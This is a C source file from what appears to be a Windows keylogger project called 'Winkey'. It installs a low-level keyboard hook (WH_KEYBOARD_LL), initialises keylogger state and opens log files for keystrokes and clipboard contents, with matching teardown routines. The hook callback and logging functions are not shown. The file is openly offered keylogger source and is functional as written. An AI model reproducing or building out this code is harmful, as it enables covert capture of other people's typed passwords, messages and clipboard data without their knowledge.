#include "winkey.h"

// Installs the low-level keyboard hook in the system
static BOOL InstallKeyboardHook(void)
{
    HINSTANCE moduleHandle;

    moduleHandle = GetModuleHandle(NULL);
    if (!moduleHandle)
        return FALSE;

    g_winkeyState.keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        moduleHandle,
        0
    );

    return (g_winkeyState.keyboardHook != NULL);
}

// Initializes the global keylogger state with default values
static void InitializeWinkeyState(void)
{
    g_winkeyState.logFile = NULL;
    g_winkeyState.keyboardHook = NULL;
    g_winkeyState.lastWindow = NULL;
    memset(g_winkeyState.lastTitle, 0, sizeof(g_winkeyState.lastTitle));
}

// Activates all keylogger components (logs and hooks)
BOOL ActivateHook(void)
{
    // Initialize keylogger state
    InitializeWinkeyState();

    // Try to open main log file
    if (!OpenLogFile()) {
        return FALSE;
    }

    // Try to open clipboard log file
    if (!OpenClipboardLog()) {
        // Clipboard is not critical, continue without it
    }

    // Install low-level keyboard hook
    if (!InstallKeyboardHook()) {
        // On failure, close opened logs
        if (g_winkeyState.logFile) {
            fclose(g_winkeyState.logFile);
            g_winkeyState.logFile = NULL;
        }
        CloseClipboardLog();
        return FALSE;
    }

    return TRUE;
}

// Deactivates and cleans up all keylogger components
void DeactivateHook(void)
{
    // Uninstall keyboard hook if active
    if (g_winkeyState.keyboardHook) {
        UnhookWindowsHookEx(g_winkeyState.keyboardHook);
        g_winkeyState.keyboardHook = NULL;
    }

    // Close main log file if open
    if (g_winkeyState.logFile) {
        fprintf(g_winkeyState.logFile, "\n\n========================= Winkey Stopped ==========================\n");
        fflush(g_winkeyState.logFile);
        fclose(g_winkeyState.logFile);
        g_winkeyState.logFile = NULL;
    }

    // Close clipboard log
    CloseClipboardLog();

    // Reinitialize state
    InitializeWinkeyState();
}